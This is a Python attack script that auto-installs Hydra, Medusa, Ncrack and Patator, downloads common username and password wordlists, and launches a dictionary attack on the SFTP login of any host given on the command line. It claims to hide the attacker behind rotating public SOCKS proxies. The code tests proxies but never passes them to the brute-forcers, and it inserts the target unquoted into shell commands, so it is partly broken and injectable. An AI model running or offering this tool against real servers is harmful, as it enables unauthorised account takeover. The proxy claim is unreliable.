#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914

import requests
import argparse
import time
import logging
import os
import subprocess
from multiprocessing import Pool, cpu_count
from itertools import cycle

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to fetch a list of SOCKS proxies from a public API
def fetch_proxies():
    proxy_api_url = "https://www.proxy-list.download/api/v1/get?type=socks5"  # Example proxy list API for SOCKS5
    response = requests.get(proxy_api_url)
    if response.status_code == 200:
        proxy_list = response.text.strip().split('\r\n')
        return proxy_list
    else:
        logging.error("Failed to retrieve proxies")
        return []

# Function to check if a SOCKS proxy is working
def check_proxy(proxy):
    try:
        proxy_url = f"socks5://{proxy}"
        response = requests.get('https://httpbin.org/ip', proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
        if response.status_code == 200:
            logging.info(f"Proxy {proxy} is working")
            return proxy
    except Exception as e:
        logging.debug(f"Proxy {proxy} failed: {e}")
    return None

# Function to rotate proxies and send requests
def send_request(url, proxies, headers=None, delay=1):
    proxy_pool = cycle(proxies)
    while True:
        proxy = next(proxy_pool)
        try:
            proxy_url = f"socks5://{proxy}"
            response = requests.get(url, proxies={"http": proxy_url, "https": proxy_url}, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logging.debug(f"Request failed with proxy {proxy}: {e}")
        time.sleep(delay)

# Function to get wordlist paths
def get_wordlist_paths(wordlist_type):
    wordlists = {
        'SecLists-usernames': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt',
        'SecLists-passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt',
        'jeanphorn-usernames': 'https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt',
        'jeanphorn-passwords': 'https://raw.githubusercontent.com/jeanphorn/wordlist/master/ssh_passwd.txt',
        'kkrypt0nn-passwords': 'https://raw.githubusercontent.com/kkrypt0nn/wordlists/master/passwords/most_common_passwords.txt',
        'rockyou-passwords': 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
    }
    return wordlists.get(wordlist_type)

# Function to download wordlist content
def download_wordlist(wordlist_url):
    response = requests.get(wordlist_url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        logging.error(f"Failed to download wordlist from {wordlist_url}")
        return []

# Function to check if a command exists
def command_exists(command):
    return subprocess.call(f"type {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Function to install dependencies
def install_dependencies():
    if os.name == 'nt':  # Windows
        logging.info("Please manually install the required tools on Windows.")
    else:  # Unix-based
        if not command_exists('hydra'):
            logging.info("Installing Hydra...")
            subprocess.call("sudo apt-get install -y hydra" if command_exists("apt-get") else "brew install hydra", shell=True)
        if not command_exists('medusa'):
            logging.info("Installing Medusa...")
            subprocess.call("sudo apt-get install -y medusa" if command_exists("apt-get") else "brew install medusa", shell=True)
        if not command_exists('ncrack'):
            logging.info("Installing Ncrack...")
            subprocess.call("sudo apt-get install -y ncrack" if command_exists("apt-get") else "brew install ncrack", shell=True)
        if not command_exists('patator'):
            logging.info("Installing Patator...")
            subprocess.call("sudo apt-get install -y patator" if command_exists("apt-get") else "brew install patator", shell=True)

# Main function
def main(target, delay, username_wordlist, password_wordlist, bruteforcer):
    try:
        install_dependencies()
        
        if not command_exists(bruteforcer):
            logging.error(f"{bruteforcer} is not installed.")
            return

        proxies = fetch_proxies()
        with Pool(cpu_count()) as p:
            working_proxies = list(filter(None, p.map(check_proxy, proxies)))

        if not working_proxies:
            logging.error("No working proxies found")
            return

        # Download username wordlist
        username_wordlist_url = get_wordlist_paths(username_wordlist)
        if username_wordlist_url:
            username_list = download_wordlist(username_wordlist_url)
            logging.info(f"Downloaded {username_wordlist} successfully")
        else:
            logging.error("Invalid username wordlist selected")
            return

        # Download password wordlist
        password_wordlist_url = get_wordlist_paths(password_wordlist)
        if password_wordlist_url:
            password_list = download_wordlist(password_wordlist_url)
            logging.info(f"Downloaded {password_wordlist} successfully")
        else:
            logging.error("Invalid password wordlist selected")
            return

        # Save wordlists to temporary files
        username_file = "/tmp/usernames.txt"
        password_file = "/tmp/passwords.txt"

        with open(username_file, 'w') as uf:
            uf.write('\n'.join(username_list))

        with open(password_file, 'w') as pf:
            pf.write('\n'.join(password_list))

        # Execute selected bruteforcer tool
        if bruteforcer == "hydra":
            os.system(f"hydra -L {username_file} -P {password_file} -s 22 -f -V -u -t 4 -o hydra-results.txt sftp://{target}")
        elif bruteforcer == "medusa":
            os.system(f"medusa -h {target} -U {username_file} -P {password_file} -M sftp -p 22")
        elif bruteforcer == "ncrack":
            os.system(f"ncrack -p 22 -U {username_file} -P {password_file} {target}")
        elif bruteforcer == "patator":
            os.system(f"patator sftp_login host={target} user=FILE0 0={username_file} password=FILE1 1={password_file}")

    except KeyboardInterrupt:
        logging.info("Script interrupted by user")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script to use public open proxies to brute-force SFTP servers.')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-d', '--delay', type=int, default=1, help='Delay between requests to prevent server exhaustion (in seconds)')
    parser.add_argument('-u', '--username-wordlist', required=True, choices=[
        'SecLists-usernames', 'jeanphorn-usernames'
    ], help='Select username wordlist source')
    parser.add_argument('-p', '--password-wordlist', required=True, choices=[
        'SecLists-passwords', 'jeanphorn-passwords', 'kkrypt0nn-passwords', 'rockyou-passwords'
    ], help='Select password wordlist source')
    parser.add_argument('-b', '--bruteforcer', required=True, choices=[
        'hydra', 'medusa', 'ncrack', 'patator'
    ], help='Select brute-forcing tool')
    args = parser.parse_args()

    main(args.target, args.delay, args.username_wordlist, args.password_wordlist, args.bruteforcer)
